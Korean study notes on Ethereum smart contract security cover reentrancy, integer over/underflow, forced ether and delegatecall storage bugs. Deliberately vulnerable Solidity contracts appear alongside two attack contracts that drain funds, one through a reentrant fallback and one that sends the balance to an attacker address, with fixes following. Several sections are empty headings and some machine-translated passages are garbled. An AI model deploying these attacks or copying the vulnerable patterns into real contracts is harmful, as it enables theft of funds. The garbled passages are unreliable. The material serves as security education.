# Smart Contract Security
스마트컨트랙트 프로그래밍에서 실수를 돌이킬 수 없는 결과를 만듦  
본 챕터에서는 보안 최고 예제와 디자인 패턴, 보안 대응 패턴을 알아 볼 것임  

프로그래밍은 개발자가 의도하지는 않았지만, 코딩한대로 작동한다  
또한, 모든 스마트컨트랙트는 퍼블릭이므로 누구나 트랜잭션을 통해서 상호 작동시킬 수 있음  
따라서, 코드가 가진 취약점을 극대화해서 공격 받을 수 있으므로 베스트 예제나 사전에 테스테된 라이브러리를 사용하는 게 좋음  

# Security Best Practices
반어적 프로그래밍이 스마트컨트랙트에서 가장 잘 맞는 프로그래밍 스타일임   
최고 실례는 다음과 같음  
### Minimalism/simplicity
복작성은 보안의 적임  
코드가 간결할 수록 버그를 더 줄일 수 있음  
스마트컨트랙트아 수천 라인 이상인 것은 보안에 문제가 있을 것으로 의심할 수 있음  
### Code reuse
바퀴를 다시 발명하지 마라  
라이브러리나 컨트랙트가 이미 존재한다면, 그것을 재사용하라  
보안 리스크는 업그레이드 보다 더 중요한 이슈임  
### Code quality
스마트컨트랙트 코드는 자비가 없음  
작은 버그가 금전적인 로스를 야기할 수 있음  
스마트컨트랙트 프로그래밍을 범용 목적의 프로그래밍처럼 여기지 마라  
우주비행체 프로그래밍을 하는 것처럼 스마트 컨트랙트 프로그래밍을 주의해서 하라  
일단 배포하면 되돌릴 수 없다  
### Readability/autitability
코드가 분명하고 이해하기 쉽게 짜야 한다  
읽기 쉬워야 감정하기도 쉽다  
이더리움 커뮤니티의 코딩 규칙을 따라서 작성해라  
### Test coverage
가능한 모든 영역을 테스팅하라  
모든 인자를 예상된 범위에서 충분히 테스트하라  

# Security Risks and Antipatterns
스마트 컨트랙트 프로글래머로서 대부분의 공통 보안 리스크와 친숙해야함  
이번 섹션에서는 보안 리스크와 어떻게 취약점이 생기고 대응 할 수 있는지 알아본다  
# Reentrancy
이더리움 스마트컨트랙트의 특징중 하나는 외부 컨트랙트의 코드를 호출하거나 이용하는 것임  
컨트랙트는 또한 이더를 핸들링하고 외부 사용자 주소로 이더를 보낼 수 있음  
이런 작업은 컨트랙트가 외부 호출을 할 수 있는 함수 목록을 제출하고 요구한다  
이런 외부 호출 부분을 해커가 폴백 함수를 통해서 추가적인 코드를 실행하고 컨트랙트를 강제한다  
이런 종류의 공격이 악명높은 DAO hack 에서 사용되었음  
## The Vulnerability
이런 공격 형태는 컨트랙트가 알수없는 주소로 이더를 보낼 때 나타날 수 있음  
해커가 폴백 함수내에 악의적인 코드를 넣어서 외부 주소의 컨트랙트를 만들 수 있음  
따라서 컨트랙트가 이 주소에 이더를 보낼때 악의적인 코드가 실행될 수 있도록 할 수 있음  
전형적으로 악의적인 코드는 취약한 컨트랙트의 함수를 실행하는데,  
원 개발자가 예상하지 못했던 작업을 수행함  
"reentrancy" 용어는 악의적인 외부 컨트랙트가 취약한 컨트랙트 함수를 호출한다는 사실로부터 만들어졌음  

아래 샘플코드 EtherStore.sol 은 매주 1 이더를 인출할 수 있게 예금자에게 허락함  
```
contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        require(msg.sender.call.value(_weiToWithdraw)());
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
 }
```
위 컨트랙트는 2개의 public 함수가 있음. depositFunds, withdrawFund  
depositFunds 는 보낸자의 잔액을 증가시키고  
withdrawFunds 는 보낸자가 인출할 수 있는 wei 의 양을 구체화함  
이 함수는 인출를 위해서 요청된 양이 1 이더보다 작거나  
인출이 지난 주에 없었을때에만 이루어짐  

위 코드의 취약점을 이용해서 공격자가 아래의 컨트랙트를 만들없음 Attack.sol  
```
import "EtherStore.sol";

contract Attack {
  EtherStore public etherStore;

  // intialize the etherStore variable with the contract address
  constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
  }

  function attackEtherStore() external payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds.value(1 ether)();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }

  function collectEther() public {
      msg.sender.transfer(this.balance);
  }

  // fallback function - where the magic happens
  function () payable {
      if (etherStore.balance > 1 ether) {
          etherStore.withdrawFunds(1 ether);
      }
  }
}
```
공격이 어떻게 이루어지나?  
첫째, 공격자가 악의적인 컨트랙트를 만든다(예 0x0...123)  
위 컨트랙트는 생성자에 인자로 EtherStore 컨트랙트의 주소를 넣어준다  
이것이 공격 대상인 컨트랙트를 etherStore 로 초기화시킨다  

따라서 공격자는 이제 attackEtherStore 함수를 호출할 수 있음  
위 예제에서 몇몇의 사용자가 이더를 이미 예금했다고 가정한다(약 10 이더)  
1. Attack.sol 의 라인 15:  EtherStore 컨트랙트의 depositFunds 함수가 1 이더의 msg.value 로 호출된다. 따라서 보낸자는 악의적인 컨트랙트의(0x0...123) 이고 잔액은 1 이더임  
2. Attack.sol 라인 17 : 악의적인 컨트랙트가 1 이더의 인자로 EtherStore 컨트랙트의 withdrawFunds 함수를 호출한다. 이것은 모든 요구사항을 통과할 것임(EtherStore 컨트랙트의 라인 12-16)  
3. EtherStore.sol 라인 17 : 컨트랙트는 악의적인 컨트랙트에게 1 이더를 돌려 줄 것임  
4. Attack.sol 라인 25 : 이때 악의적인 컨트랙트의 지불 절차가 폴백 함수를 실행할 것임  
5. Attack.sol 라인 26 : EtherStore 컨트랙트의 전체 잔액이 10 이더이고 현재는 9 이더이므로 진술문을 통과할 것임  
6. Attack.sol 라인 27 : 폴백 함수가 EtherStore 의 withdrawFunds 함수를 다시 호출하고 EtherStore 컨트랙트에 재진입한다  
7. EtherStore.sol 라인 11 : withdrawFunds 의 2번째 호출에서 공격하는 컨트랙트의 잔액은 여전히 1 이더 임. 라인 18이 아직 실행되지 않았으므로. 따라서 balances[0x0...123] = 1 ether 임. 이것은 또한 lastWithdrawTime 변수의 경우이다. 다시 모든 요구사항을 통과한다.  
8. EtherStore.sol 라인 17 : 공격하는 컨트랙트가 또하나의 1 이더를 인출함  
9. 단계 4-8 반복함, EtherStore.balance > 1 더 이상 안 맞을 때까지  
10. Attack.sol 라인 26 : 일단 EtherStore 컨트랙트에 1 이더 보다 적게 남는다면 if 조건문을 실패할 것이다. 이것은 EtherStore 컨트랙트의 라인 18, 19 번을 실행하게 한다.  
11. EtherStore.sol 라인 18, 19 : balances 와 lastWithdrawTime 매핑은 값이 설정되고 실행은 종료할 것임  

## Preventative Techniques
잠재적인 재진입 취약점을 회피하기 위한 몇가지 공통 기술이 있음  
첫째는 이더를 외부주소로 보낼때는 가능한 내부 함수인 transfer 를 사용하라   
transfer 함수는 외부 호출에 오직 2300 gas를 사용하므로 목적지 주소나 컨트랙트가 또다른 컨트랙트를 호춯하기에는 가스가 충분하지 않다  

두번째 기술은 상태 변수를 바꾸는 모든 로직은 이더가 컨트랙트 외부로 보내지기 전에 이루어지게 한다  
EtherStore 예제 라인 18, 19는 라인 17 전에서 놓여야 한다  
이것이 좋은 실예이다. 
외부 호출을 알수없는 주소로 수행하는 어떤 코드도 로컬 함수나 코드 실행의 마지막 부분에 행해야한다  

세번재 기술은 뮤텍스이다. 즉, 코드 실행동안에서 상태 변수를 막는 기능을 넣는다  
아래 예제는 재진입 호출에 자유로는 컨트랙트임  
```
contract EtherStore {

    // initialize the mutex
    bool reEntrancyMutex = false;
    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(!reEntrancyMutex);
        require(balances[msg.sender] >= _weiToWithdraw);
        // limit the withdrawal
        require(_weiToWithdraw <= withdrawalLimit);
        // limit the time allowed to withdraw
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
        // set the reEntrancy mutex before the external call
        reEntrancyMutex = true;
        msg.sender.transfer(_weiToWithdraw);
        // release the mutex after the external call
        reEntrancyMutex = false;
    }
 }
 ```
 
## Real-World Example: The DAO  
 DAO(분산화된 자율 조직) 공격은 이더리움의 초기 개발단계에서 나타난 주요 공격중에 하나임  
 그 당시 컨트랙트는 150만 달러를 가지고 있었고, 재진입 공격 발생했다  
 그 결과로 하드포크가 일어나 이더리움 클래식으로 분화됨  
 
# Arithmetic Over/Underflows
EVM 은 integer 의 고정된 크기의 데이터 타입만 구체화한다  
이것은 integer 변수는 정해진 범위의 숫가만 나타낼 수 있다는 것을 의미함  
uint8 은 오직 [0, 255] 범위 숫자만 저장할 수 있다  
256 값을 저장하려고하면 최종 결과는 0 이다.  
따라서 입력값을 주의해서 다뤄야 함  

## The Vulnerability
오버나 언더플로우는 고정된 크기 변수를 넘어서는 값을 저장하려고 할때 나타남  
이런 종류의 공격은 예상할 수 없는 결과를 만들도록함  
아래는 TimeLock.sol 예제임  
```
contract TimeLock {

    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = now + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0);
        require(now > lockTime[msg.sender]);
        uint transferValue = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
}
```
위 컨트랙트는 시간 납골 천장처럼 작동하도록 설계했음  
사용자가 이더를 예치하면 최소 1주일 동안 잠긴다  
사용자가 자신의 비밀키를 넘겨줘야하는 상황에서  
이와 같은 컨트랙트는 일정 기간동안 이더는 사용될 수 없다  
공격자는 lockTime 에 관계없이 이더 를 받기위해서 오버플로우를 사용함 수 있음  

공격자는 공격 대상의 키와 해당 주소의 현재 lockTime를 결정할 수 있음  
이것을 userLockTime 이라고 하자  
그때 increaseLockTime 함수를 호출할 수 있고, 2^256 - userLockTime 을 인자로 전달한다  
이것은 오버플로우를 발생시키고, lockTime[msg.sender] = 0 으로 만듦  
그 이후에 공격자는 withdraw 함수를 호출하여 보상금을 얻는다  

아래는 언더플로우 예제임 
```
pragma solidity ^0.4.18;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  function Token(uint _initialSupply) {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public constant returns (uint balance) {
    return balances[_owner];
  }
}
```
이것은 transfer 함수를 사용해서 참여자간에 토큰을 이동하는 컨트랙트임  
구멍은 transfer 함수이 있다   
라인 13에 require 문이 언더플로우를 사용해서 통과할 수 있음  
한 사용자가 0 잔액이 있다고 하자.  
그 사용자는 none 제로 _value 와 require 문을 통과하게 transfer 함수를 호출함  
이것은 balances[msg.sender] = 0 이고 따라서 어떤 양수 값으로 빼주면 결과도 양수가 된다.  
이것은 라인 14 번에서도 true 이고 잔액이 양수로 치환된다  
그래서 공격자가 언더플로우 취약점으로 공짜 토큰을 얻게 된다  

## Preventative Techniques
언더/오버플로우 취약점을 대응하는 규약 기술은 덧셈, 뺄셈, 곱셈 연산자를 수학 라이브러리로 사용한 것임(나눗셈인 필요없음, 0 으로 나누는 것은 EVM 이 중지시킴)  
OpenZeppelin 이 SafeMath 라이브러리를 제공함  
아래에는 TimeLock 컨트랙트에 SafeMath 라이브러리 사용 예제임  
```
library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // This holds in all cases
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract TimeLock {
    using SafeMath for uint; // use the library for uint type
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] = balances[msg.sender].add(msg.value);
        lockTime[msg.sender] = now.add(1 weeks);
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] = lockTime[msg.sender].add(_secondsToIncrease);
    }

    function withdraw() public {
        require(balances[msg.sender] > 0);
        require(now > lockTime[msg.sender]);
        uint256 transferValue = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
}
```
모든 수학 연산이 SafeMath 라이브러리로 대체된 것을 볼 수 있음  

## Real-World Examples: PoWHC and Batch Transfer Overflow (CVE-2018–10299) 
Proof of Weak Hands Coin(PoWHC) 은 오버/언더플로우 공격에 좋은 예제임  
866 이더를 분실했음  

# Unexpected Ether
일반적으로 컨트랙트에 이더가 보내지면, 폴백 함수나 사전 정의돈 함수가 실행됨  
하지만 어떤 코드도 실행하지 않고 이더가 컨트랙트에 존재할 2가지 예외 사항이 있음  
컨트랙트의 모든 이더가 코드 실행에 의지하는 것은 이더가 강제적으로 보내지는 공격에 취약할 수 있음  

## The Vulnerability
정확한 상태 전환이나 행위 검증에 유용한 공통 방어 프로그래밍 기술은 불변성 체크임  
이 기술은 불변성 집단을 정의하거나 한 단위 행위 이후에 불변성을 체크하는 것과 관련있음  
불변성 체크를 실질적으로 불변한지 점검하는 것은 좋은 설계임  
한 가지 예로서 ERC20 token 에서 totalSupply 는 불변해야함  
따라서 어느 함수에서도 totalSupply 를 처음으로 초기화한 이후에 값을 변경할 수 없음  

payable 함수 또는 컨트랙트 코드 실행없이 이더를 보낼 수 있는 2가지 방법이 있음  
#### Self-destruct/suicide
    어떤 컨트랙트도 selfdestruct 함수를 구현할 수 있음  
    만약 반환 주소가 컨트랙트라면 폴백 함수뿐만아니라 다른 함수도 호출되지 않음
    그래서 selfdestruct 함수는 강제적으로 어떤 컨트랙트에도 이더를 보내는데 사용될 수 있음  
    해당 컨트랙트가 payable 함수가 없어도 됨  
    이것은 공격자가 selfdestruct(target) 을 호출하는 컨트랙트를 만들수 있음을 의미  

#### Pre-sent ether
    컨트랙트로 이더를 얻는 또다른 방법은 이더와 함께 컨트랙트 주소를 사전 로드하는 것임
    컨트랙트 주소는 결정론적임. 
    즉, 주소는 Keccak-256로 계산됨  
    해당 인자는 컨트랙트를 만드는 주소의 해시와 컨트랙트를 만드는 트랜잭션의 nonce 임  
    형태는 address = sha3(rlp.encode([account_address,transaction_nonce]))  
    이것은 누구나 컨트랙트 주소가 만들어지기 전에 해당 주소를 만들 수 있고, 해당 주소에 이더를 보낼 수 있다는 것을 의미함  
    따라서 해당 컨트랙트가 만들어졌을때 이더 잔액이 제로가 아님  
    
아래 EtherGame.sol 예제를 보자
```
contract EtherGame {

    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether;
    uint public finalMileStone = 10 ether;
    uint public finalReward = 5 ether;

    mapping(address => uint) redeemableEther;
    // Users pay 0.5 ether. At specific milestones, credit their accounts.
    function play() external payable {
        require(msg.value == 0.5 ether); // each play is 0.5 ether
        uint currentBalance = this.balance + msg.value;
        // ensure no players after the game has finished
        require(currentBalance <= finalMileStone);
        // if at a milestone, credit the player's account
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        return;
    }

    function claimReward() public {
        // ensure the game is complete
        require(this.balance == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] > 0);
        uint transferValue = redeemableEther[msg.sender];
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
 }
```
이 컨트랙트 예제는 자연적인 레이스 조건과 관련된 단순한 게임임  
플레이어가 단순히 컨트랙트에 0.5 이더를 보낸다  
플레이어는 세가지 마일스톤 중에 하나는 만족할 것이라는 기대를 가짐  
마일스톤에 처음으로 도달하면 보상분의 이더를 받고 게임은 끝남   

EtherGame 컨트랙트의 주요 이슈는 라인 14, 32 에서 this.balance 의 잘못된 사용에서 기원함  
공격자가 selfdestruct 함수를 통해서 작은 양의 이더를 보낸수 있고( 0.1 ),  
누구도 마일스톤에 도달할 수 없도록 막을 수 있음  
this.balance 은 현재 0.1 이므로 0.5 에 결고 도달할 수 없고,  
하지만 다른 플레이어들은 0.5 이더를 계속보내고 있다  
이것은 라인 18, 21, 24 를 true로 해서 막는다  


또한 한 공격자가 10 이더를 보내면, finalMileStone 보다 크므로 모든 보상금을 영원히 못 받게 말을 수 도 있음  

## Preventative Techniques
이런 종류의 취약점은 this.balance 의 오용 때문임  
컨트랙트 로직은 가능한 컨트랙트 잔액의 값에 의존한것을 피해야함  

예치된 이더의 정확한 값을 요구한다면, 자신이 정한 변수를 사용해야함  
그 변수는 payable 함수에서 증가하거나, 안전하게 예치된 이더를 추적할 있게 해야함  
이런 변수는 selfdestruct 호출에 의해서 보내진 이더에 의해서 영향받지 않게 해야 함  

아래는 EtherGame 컨트랙트 수정된 버전임  
```
contract EtherGame {

    uint public payoutMileStone1 = 3 ether;
    uint public mileStone1Reward = 2 ether;
    uint public payoutMileStone2 = 5 ether;
    uint public mileStone2Reward = 3 ether;
    uint public finalMileStone = 10 ether;
    uint public finalReward = 5 ether;
    uint public depositedWei;

    mapping (address => uint) redeemableEther;

    function play() external payable {
        require(msg.value == 0.5 ether);
        uint currentBalance = depositedWei + msg.value;
        // ensure no players after the game has finished
        require(currentBalance <= finalMileStone);
        if (currentBalance == payoutMileStone1) {
            redeemableEther[msg.sender] += mileStone1Reward;
        }
        else if (currentBalance == payoutMileStone2) {
            redeemableEther[msg.sender] += mileStone2Reward;
        }
        else if (currentBalance == finalMileStone ) {
            redeemableEther[msg.sender] += finalReward;
        }
        depositedWei += msg.value;
        return;
    }

    function claimReward() public {
        // ensure the game is complete
        require(depositedWei == finalMileStone);
        // ensure there is a reward to give
        require(redeemableEther[msg.sender] > 0);
        uint transferValue = redeemableEther[msg.sender];
        redeemableEther[msg.sender] = 0;
        msg.sender.transfer(transferValue);
    }
 }
```
여기서 새 변수 depositedWei 를 사용함  
예치된 이더의 추적용으로 사용함  
여기서 더 이상 this.balbance 를 사용하지 않음을 주의해서 보라  

# DELEGATECALL
CALL 및 DELEGECALL 오코드는 Ethereum 개발자가 코드를 모듈화할 수 있도록 하는 데 유용합니다.   
계약에 대한 표준 외부 메시지 호출은 CALL opcode에 의해 처리되며, 여기서 코드는 외부 계약/함수의 컨텍스트에서 실행됩니다.   
대상 주소에서 실행되는 코드가 호출 계약의 컨텍스트에서 실행되고 msg.sender 및 msg.value가 변경되지 않는다는 점을 제외하면 DELETECALL opcode는 거의 동일합니다.   
이 기능은 라이브러리 구현을 가능하게 하여 개발자가 재사용 가능한 코드를 한 번 배포한 후 향후 계약에서 호출할 수 있도록 합니다.  

이 두 오피코드 간의 차이는 간단하고 직관적이지만 DELADECALL을 사용하면 예기치 않은 코드가 실행될 수 있습니다.  

자세한 내용은 Loi를 참조하십시오.이 주제와 Solidity 문서에 대한 Luu의 Ethereum Stack Exchange 질문입니다.  

## The Vulnerability
DELEGECALL의 컨텍스트 보존 특성으로 인해 취약성이 없는 사용자 지정 라이브러리를 구축하는 것은 생각보다 쉽지 않습니다.   
라이브러리의 코드 자체는 안전하고 취약성이 없을 수 있지만 다른 응용 프로그램의 컨텍스트에서 실행될 경우 새로운 취약성이 발생할 수 있습니다. 피보나찌 숫자를 사용한 꽤 복잡한 예를 보자.

FibonacchiLib.sol의 라이브러리를 고려하십시오.   
이 라이브러리는 Fibonacchi 시퀀스와 유사한 형식의 시퀀스를 생성할 수 있습니다(참고: 이 코드는 https://bit.ly/2에서 수정되었습니다) 

Example 6. FibonacciLib.sol  
```
// library contract - calculates Fibonacci-like numbers
contract FibonacciLib {
    // initializing the standard Fibonacci sequence
    uint public start;
    uint public calculatedFibNumber;

    // modify the zeroth number in the sequence
    function setStart(uint _start) public {
        start = _start;
    }

    function setFibonacci(uint n) public {
        calculatedFibNumber = fibonacci(n);
    }

    function fibonacci(uint n) internal returns (uint) {
        if (n == 0) return start;
        else if (n == 1) return start + 1;
        else return fibonacci(n - 1) + fibonacci(n - 2);
    }
}
```
이 라이브러리는 시퀀스에서 n번째 피보나치 숫자를 생성할 수 있는 함수를 제공합니다.   
사용자는 이 새 시퀀스에서 시퀀스의 시작 번호(시작)를 변경하고 n번째 Fibonacci 유사 숫자를 계산할 수 있습니다.

이제 FibonacciBalance.sol에 나와 있는 이 라이브러리를 활용하는 계약을 고려해 보겠습니다.  
Example 7. FibonacciBalance.sol  
```
contract FibonacciBalance {

    address public fibonacciLibrary;
    // the current Fibonacci number to withdraw
    uint public calculatedFibNumber;
    // the starting Fibonacci sequence number
    uint public start = 3;
    uint public withdrawalCounter;
    // the Fibonancci function selector
    bytes4 constant fibSig = bytes4(sha3("setFibonacci(uint256)"));

    // constructor - loads the contract with ether
    constructor(address _fibonacciLibrary) external payable {
        fibonacciLibrary = _fibonacciLibrary;
    }

    function withdraw() {
        withdrawalCounter += 1;
        // calculate the Fibonacci number for the current withdrawal user-
        // this sets calculatedFibNumber
        require(fibonacciLibrary.delegatecall(fibSig, withdrawalCounter));
        msg.sender.transfer(calculatedFibNumber * 1 ether);
    }

    // allow users to call Fibonacci library functions
    function() public {
        require(fibonacciLibrary.delegatecall(msg.data));
    }
}
```
이 계약은 참가자가 계약에서 에테르를 인출할 수 있도록 합니다. 즉, 첫 번째 참가자는 1 에테르를 받고, 두 번째 참가자는 1 에테르를 받고, 세 번째 참가자는 2 에테르를 받고, 네 번째 참가자는 3 에테르를 받고, 다섯 번째 5 등입니다. 인출되는 피보나치 번호보다 작습니다.)

이 계약에는 설명이 필요할 수 있는 여러 요소가 있습니다. 첫째, fibSig라는 재미있게 생긴 변수가 있습니다. 여기에는 'setFibonacci(uint256)' 문자열의 Keccak-256(SHA-3) 해시의 처음 4바이트가 저장됩니다. 이를 함수 선택기라고 하며, 호출 데이터에 입력되어 스마트 계약의 호출 기능을 지정합니다.   
이 기능은 라인 21의 대리자 통화 기능에 사용되어 피보나치(uint256) 기능을 실행하도록 지정합니다. delegatecall의 두 번째 인수는 함수에 전달할 매개 변수입니다.   
둘째, 우리는 FibonacciLib 라이브러리의 주소가 생성자에서 올바르게 참조되고 있다고 가정한다(외부 계약 참조는 이러한 종류의 계약 참조 초기화와 관련된 몇 가지 잠재적 취약점을 논의한다).  
이 계약서에서 오류를 발견할 수 있습니까? 이 계약을 배포하고 에테르를 채운 다음 전화를 끊는다면, 그것은 되돌아갈 것입니다.

상태 변수 시작이 라이브러리와 주 호출 계약에서 모두 사용됨을 알 수 있습니다. 라이브러리 계약에서 시작은 Fibonacci 시퀀스의 시작을 지정하는 데 사용되며 호출 계약에서는 3으로 설정된 반면 0으로 설정됩니다. 또한 FibonacciBalance 계약의 폴백 기능을 통해 모든 호출을 라이브러리 계약으로 전달하여 라이브러리 계약의 setStart 기능을 호출할 수 있습니다. 계약 상태를 보존한다는 점을 상기하면, 이 기능을 통해 현지 Fibonnacci Balance 계약에서 시작 변수의 상태를 변경할 수 있습니다. 그러면 계산된 FibNumber는 시작 변수에 따라 달라지기 때문에(라이브러리 계약에서 보듯이) 더 많은 에테르를 인출할 수 있습니다. 실제로 setStart 함수는 FibonacciBalance 계약에서 시작 변수를 수정하지 않으며 수정할 수도 없습니다. 이 계약의 기본 취약성은 단순히 시작 변수를 수정하는 것보다 훨씬 더 심각합니다.  

실제 문제에 대해 논의하기 전에 상태 변수가 실제로 계약에 어떻게 저장되는지 간단히 살펴보겠습니다. 상태 또는 스토리지 변수(개별 트랜잭션에 걸쳐 지속되는 변수)는 계약에 소개된 대로 순차적으로 슬롯에 배치됩니다. (여기에 몇 가지 복잡한 사항이 있습니다. 자세한 내용은 Solidity 문서를 참조하십시오.)

예를 들어, 도서관 계약서를 살펴보자. 시작 및 계산된 FibNumber의 두 가지 상태 변수가 있습니다. 첫 번째 변수, 시작은 [0] 슬롯(즉, 첫 번째 슬롯)의 계약 저장소에 저장됩니다. 두 번째 변수, 계산된 FibNumber는 사용 가능한 다음 저장소 슬롯[1]에 배치됩니다. setStart 함수는 입력을 받아 입력을 무엇이든 start로 설정합니다. 따라서 이 함수는 슬롯[0]을 setStart 함수에 제공하는 모든 입력으로 설정합니다. 마찬가지로 설정된 Fibonacci 함수는 계산된 FibNumber를 fibonacci(n)의 결과로 설정합니다. 이는 저장 슬롯[1]을 fibonacci(n) 값으로 설정하기만 하면 됩니다.  

이제 피보나치 밸런스 계약서를 봅시다. 이제 저장 슬롯[0]은 피보나치 라이브러리 주소에 해당하고 슬롯[1]은 계산된 FibNumber에 해당합니다. 이 잘못된 매핑에서 취약성이 발생합니다. delegatecall은 계약 컨텍스트를 보존합니다. 이는 대리자 호출을 통해 실행되는 코드가 호출 계약의 상태(즉, 저장소)에 따라 작동함을 의미합니다.

21번 라인에서 인출 시 fibonaciLibrary.delegatecall(fibSig, 인출 카운터)을 실행합니다. 이렇게 하면 setFibonacci 함수가 호출됩니다. 이 함수는 앞서 설명한 대로 현재 컨텍스트에서 계산된 FibNumber 스토리지 슬롯[1]을 수정합니다. 이는 예상대로입니다(즉, 실행 후 계산된 FibNumber가 수정됨). 그러나 FibonacciLib 계약의 시작 변수는 현재 계약의 fibonaciLib 주소인 저장소 슬롯[0]에 있습니다. 이는 피보나찌 함수가 예상치 못한 결과를 준다는 것을 의미합니다. 이는 현재 호출 컨텍스트에서 fibonacciLibrary 주소(흔히 unt로 해석될 때 상당히 큰)인 start(슬롯[0])를 참조하기 때문입니다. 따라서 인출 기능은 계산된 FibNumber가 반환되는 unt(fibonacci Library) 양의 에테르를 포함하지 않기 때문에 되돌아갈 가능성이 높습니다.  
더욱이 피보나치 밸런스 계약을 통해 사용자는 줄 26의 폴백 기능을 통해 모든 피보나치 라이브러리 기능을 호출할 수 있습니다. 앞에서 설명한 것처럼 setStart 기능도 포함되어 있습니다. 이 기능을 통해 누구나 스토리지 슬롯을 수정하거나 설정할 수 있습니다[0]. 이 경우 저장소 슬롯[0]은 피보나치 라이브러리 주소입니다. 따라서 공격자는 악의적인 계약을 만들고 주소를 unt로 변환한 다음 setStart(<attack_contract_address>,16)를 호출할 수 있습니다. 이렇게 하면 피보나치 라이브러리가 공격 계약의 주소로 변경됩니다. 그러면 사용자가 탈퇴나 폴백 기능을 호출할 때마다 fibonacchi Library의 실제 주소를 수정했기 때문에 악성 계약이 실행됩니다(계약 잔액 전체를 도용할 수 있음). 그러한 공격 계약의 예는 다음과 같다.  
```
contract Attack {
    uint storageSlot0; // corresponds to fibonacciLibrary
    uint storageSlot1; // corresponds to calculatedFibNumber

    // fallback - this will run if a specified function is not found
    function() public {
        storageSlot1 = 0; // we set calculatedFibNumber to 0, so if withdraw
        // is called we don't send out any ether
        <attacker_address>.transfer(this.balance); // we take all the ether
    }
 }
```
이 공격 계약은 스토리지 슬롯[1]을 변경하여 계산된 Fib 번호를 수정합니다. 원칙적으로 공격자는 선택한 다른 스토리지 슬롯을 수정하여 이 계약에 대한 모든 종류의 공격을 수행할 수 있습니다. 이러한 계약을 리믹스에 넣고 딜러 통화 기능을 통해 다양한 공격 계약 및 상태 변경을 실험하는 것이 좋습니다.

또한 Delegate 호출이 상태를 보존한다고 할 때 계약의 변수 이름이 아니라 해당 이름이 가리키는 실제 저장소 슬롯에 대해 이야기하는 것입니다. 이 예에서 볼 수 있듯이, 단순한 실수로 공격자가 전체 계약과 계약 에테르를 가로챌 수 있습니다.  

## Preventative Techniques
Solidity는 라이브러리 계약을 구현하기 위한 라이브러리 키워드를 제공합니다(자세한 내용은 문서 참조). 이렇게 하면 라이브러리 계약이 상태 비저장 상태이며 자체 파기할 수 없습니다. 라이브러리를 상태 비저장 상태로 강제로 지정하면 이 섹션에서 설명하는 스토리지 컨텍스트의 복잡성을 줄일 수 있습니다. 상태 비저장 라이브러리는 또한 공격자가 라이브러리의 코드에 종속된 계약에 영향을 미치기 위해 라이브러리 상태를 직접 수정하는 공격을 방지합니다. 일반적으로 DELEGECALL을 사용할 때는 라이브러리 계약과 호출 계약의 가능한 호출 컨텍스트에 주의하고 가능하면 상태 비저장 라이브러리를 빌드하십시오.  

## Real-World Example: Parity Multisig Wallet (Second Hack)



# Entropy Illusion

## The Vulnerability

## Preventative Techniques

## Real-World Example: PRNG Contracts

# External Contract Referencing

## The Vulnerability

## Preventative Techniques

## Real-World Example: Reentrancy Honey Pot

# Short Address/Parameter Attack

## The Vulnerability

## Preventative Techniques

# Unchecked CALL Return Values

## The Vulnerability

## Preventative Techniques

## Real-World Example: Etherpot and King of the Ether

# Race Conditions/Front Running

## The Vulnerability

## Preventative Techniques

## Real-World Examples: ERC20 and Bancor

# Denial of Service (DoS)

## The Vulnerability
### Looping through externally manipulated mappings or arrays
### Owner operations
### Progressing state based on external calls

## Preventative Techniques

